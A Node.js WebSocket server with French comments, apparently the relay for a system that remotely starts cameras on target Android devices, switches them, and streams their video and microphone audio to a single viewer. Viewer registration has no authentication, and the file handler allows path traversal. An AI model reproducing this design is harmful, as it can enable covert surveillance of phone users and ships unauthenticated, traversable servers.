const fs = require('fs');
const https = require('https');
const path = require('path');
const WebSocket = require('ws');

const serverConfig = {
    key: fs.readFileSync('key.pem'),
    cert: fs.readFileSync('cert.pem')
};

const server = https.createServer(serverConfig, (req, res) => {
    const publicFolder = '/var/www/html/stratosphere/public';
    let requestPath = req.url.split('?')[0];
    let targetFile = requestPath === '/' ? 'index.html' : requestPath;
    let filePath = path.join(publicFolder, targetFile);
    
    fs.readFile(filePath, (err, content) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
            res.end(`Fichier non trouve (${targetFile})`);
        } else {
            let ext = path.extname(filePath);
            let contentType = 'text/html';
            if (ext === '.js') contentType = 'text/javascript';
            if (ext === '.css') contentType = 'text/css';

            res.writeHead(200, { 'Content-Type': contentType });
            res.end(content, 'utf-8');
        }
    });
});

const wss = new WebSocket.Server({ server });

let viewerSocket = null;

// SEPARATION DES SOCKETS : commande vs video vs audio
let deviceSockets  = new Map();  // register-device-app  -> socket de COMMANDE
let streamerSockets = new Map(); // register-streamer     -> socket VIDEO (WebRTC)
let audioSockets    = new Map(); // register-audio-stream -> socket AUDIO (micro)

// Table IP -> deviceId (remplie par register-device-app)
let ipToDeviceId = new Map();

wss.on('connection', (ws) => {
    const clientUuid = Math.random().toString(36).substring(2, 10);
    ws.clientUuid = clientUuid;
    const remoteIp = ws._socket ? ws._socket.remoteAddress : 'unknown';
    console.log(`[+] Connexion (Socket: ${clientUuid}, IP: ${remoteIp})`);

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            switch (data.type) {
                case 'register-viewer':
                    viewerSocket = ws;
                    ws.isViewer = true;
                    console.log(`[REGIE] Viewer enregistre.`);
                    break;

                case 'register-device-app': {
                    // Socket de COMMANDE (tache de fond Android)
                    const devId = String(data.deviceId).trim();
                    if (devId && devId !== 'undefined' && devId !== 'null') {
                        ws.id = devId;
                        ws.socketRole = 'command';
                        deviceSockets.set(devId, ws);
                        
                        const ip = ws._socket ? ws._socket.remoteAddress : null;
                        if (ip) ipToDeviceId.set(ip, devId);
                        
                        console.log(`[APPAREIL] ID "${devId}" enregistre - socket COMMANDE (IP: ${ip || '?'})`);
                    } else {
                        console.log(`[APPAREIL] register-device-app SANS deviceId valide (socket: ${clientUuid})`);
                    }
                    break;
                }

                case 'cmd-trigger-live':
                    console.log(`[ORDRE] LIVE pour cibles : ${data.targets}`);
                    data.targets.forEach(id => {
                        const sid = String(id).trim();
                        // Chercher d'abord dans deviceSockets (commande), puis streamerSockets
                        let target = deviceSockets.get(sid) || streamerSockets.get(sid);
                        if (target && target.readyState === WebSocket.OPEN) {
                            console.log(`[ROUTAGE] force-start-camera -> "${sid}"`);
                            target.send(JSON.stringify({ type: 'force-start-camera' }));
                        } else {
                            console.log(`[ECHEC] Appareil "${sid}" non connecte.`);
                        }
                    });
                    break;

                case 'register-streamer': {
                    // Socket VIDEO (WebRTC stream)
                    let devId = data.deviceId ? String(data.deviceId).trim() : null;
                    
                    if (!devId || devId === 'undefined' || devId === 'null' || devId === '') {
                        // Resolution par IP
                        const ip = ws._socket ? ws._socket.remoteAddress : null;
                        if (ip && ipToDeviceId.has(ip)) {
                            devId = ipToDeviceId.get(ip);
                            console.log(`[RESOLUTION] Streamer resolu par IP -> ID: "${devId}"`);
                        }
                        
                        if (!devId || devId === 'undefined') {
                            for (const [existingId, existingWs] of deviceSockets.entries()) {
                                const existingIp = existingWs._socket ? existingWs._socket.remoteAddress : null;
                                if (existingIp === ip && existingId !== 'undefined') {
                                    devId = existingId;
                                    console.log(`[RESOLUTION] Streamer resolu par scan -> ID: "${devId}"`);
                                    break;
                                }
                            }
                        }
                        
                        if (!devId || devId === 'undefined') {
                            devId = clientUuid;
                            console.log(`[FALLBACK] Streamer -> UUID: "${devId}"`);
                        }
                    }
                    
                    ws.id = devId;
                    ws.socketRole = 'streamer';
                    streamerSockets.set(devId, ws);
                    // NE PAS ecraser deviceSockets ici !
                    
                    console.log(`[FLUX VIDEO] Appareil "${devId}" - socket VIDEO enregistre.`);
                    
                    if (viewerSocket && viewerSocket.readyState === WebSocket.OPEN) {
                        viewerSocket.send(JSON.stringify({ type: 'streamer-ready', from: devId }));
                    }
                    break;
                }

                case 'offer':
                case 'answer':
                case 'candidate':
                case 'candidate-viewer':
                    // Routage WebRTC
                    if (ws.isViewer) {
                        // Viewer -> Streamer (socket video)
                        let dest = streamerSockets.get(data.to);
                        if (dest && dest.readyState === WebSocket.OPEN) {
                            if (data.type === 'candidate-viewer') {
                                dest.send(JSON.stringify({ type: 'candidate', candidate: data.candidate }));
                            } else {
                                dest.send(JSON.stringify(data));
                            }
                        }
                    } else {
                        // Streamer -> Viewer
                        if (viewerSocket && viewerSocket.readyState === WebSocket.OPEN) {
                            data.from = ws.id;
                            viewerSocket.send(JSON.stringify(data));
                        }
                    }
                    break;

                case 'command-forward': {
                    // Commandes du viewer (switch camera, etc.)
                    // Pour STREAMBACK/STREAMFRONT : envoyer au socket STREAMER (WebView qui a getUserMedia)
                    // Pour autres commandes : envoyer au socket COMMANDE (app native)
                    if (!ws.isViewer || !data.to) break;
                    
                    const targetId = String(data.to).trim();
                    const cmd = data.command;
                    
                    // Commandes camera -> socket streamer (WebView streamer.html)
                    if (cmd === 'STREAMBACK' || cmd === 'STREAMFRONT') {
                        let dest = streamerSockets.get(targetId);
                        if (dest && dest.readyState === WebSocket.OPEN) {
                            dest.send(JSON.stringify({ type: 'command', command: cmd }));
                            console.log(`[CMD] "${cmd}" -> appareil "${targetId}" (via streamer/WebView)`);
                        } else {
                            console.log(`[CMD ECHEC] Socket streamer "${targetId}" non trouve pour ${cmd}`);
                        }
                    } else {
                        // Autres commandes -> socket de commande (app native)
                        let dest = deviceSockets.get(targetId) || streamerSockets.get(targetId);
                        if (dest && dest.readyState === WebSocket.OPEN) {
                            dest.send(JSON.stringify({ type: 'command', command: cmd }));
                            console.log(`[CMD] "${cmd}" -> appareil "${targetId}" (via ${dest.socketRole || '?'})`);
                        } else {
                            console.log(`[CMD ECHEC] Appareil "${targetId}" non trouve.`);
                        }
                    }
                    break;
                }

                case 'debug-feedback':
                    // Feedback de debug depuis le streamer (WebView) -> affiche dans la console serveur
                    console.log(`[PHONE DEBUG] ${data.message || data.msg || JSON.stringify(data)}`);
                    break;

                case 'register-audio-stream': {
                    // Socket AUDIO MICRO depuis l'app Android
                    const audioDevId = data.deviceId ? String(data.deviceId).trim() : clientUuid;
                    ws.id = audioDevId;
                    ws.socketRole = 'audio';
                    audioSockets.set(audioDevId, ws);
                    console.log(`[AUDIO] Appareil "${audioDevId}" - socket AUDIO enregistre.`);
                    
                    // Notifier le viewer qu'un flux audio est disponible
                    if (viewerSocket && viewerSocket.readyState === WebSocket.OPEN) {
                        viewerSocket.send(JSON.stringify({ type: 'audio-stream-ready', from: audioDevId }));
                    }
                    break;
                }

                case 'audio-data': {
                    // Relay des chunks audio vers le viewer
                    if (viewerSocket && viewerSocket.readyState === WebSocket.OPEN) {
                        viewerSocket.send(JSON.stringify(data));
                    }
                    break;
                }
            }
        } catch (e) {
            console.error(`[-] Erreur sur socket ${clientUuid}:`, e.message);
        }
    });

    ws.on('close', () => {
        if (ws.isViewer) {
            viewerSocket = null;
            console.log('[REGIE] Viewer deconnecte.');
        } else if (ws.id) {
            // Nettoyer la bonne map selon le role du socket
            if (ws.socketRole === 'command' && deviceSockets.get(ws.id) === ws) {
                console.log(`[DECONNEXION] Appareil "${ws.id}" - socket COMMANDE ferme.`);
                deviceSockets.delete(ws.id);
            }
            if (ws.socketRole === 'streamer' && streamerSockets.get(ws.id) === ws) {
                console.log(`[DECONNEXION] Appareil "${ws.id}" - socket VIDEO ferme.`);
                streamerSockets.delete(ws.id);
                if (viewerSocket && viewerSocket.readyState === WebSocket.OPEN) {
                    viewerSocket.send(JSON.stringify({ type: 'streamer-left', from: ws.id }));
                }
            }
            if (ws.socketRole === 'audio' && audioSockets.get(ws.id) === ws) {
                console.log(`[DECONNEXION] Appareil "${ws.id}" - socket AUDIO ferme.`);
                audioSockets.delete(ws.id);
                if (viewerSocket && viewerSocket.readyState === WebSocket.OPEN) {
                    viewerSocket.send(JSON.stringify({ type: 'audio-stream-ended', from: ws.id }));
                }
            }
            // Fallback si socketRole pas defini (ancien comportement)
            if (!ws.socketRole) {
                deviceSockets.delete(ws.id);
                streamerSockets.delete(ws.id);
                if (viewerSocket && viewerSocket.readyState === WebSocket.OPEN) {
                    viewerSocket.send(JSON.stringify({ type: 'streamer-left', from: ws.id }));
                }
            }
        }
    });
});

server.listen(8443, '0.0.0.0', () => {
    console.log('=== Stratosphere WebRTC Actif sur Port 8443 ===');
});
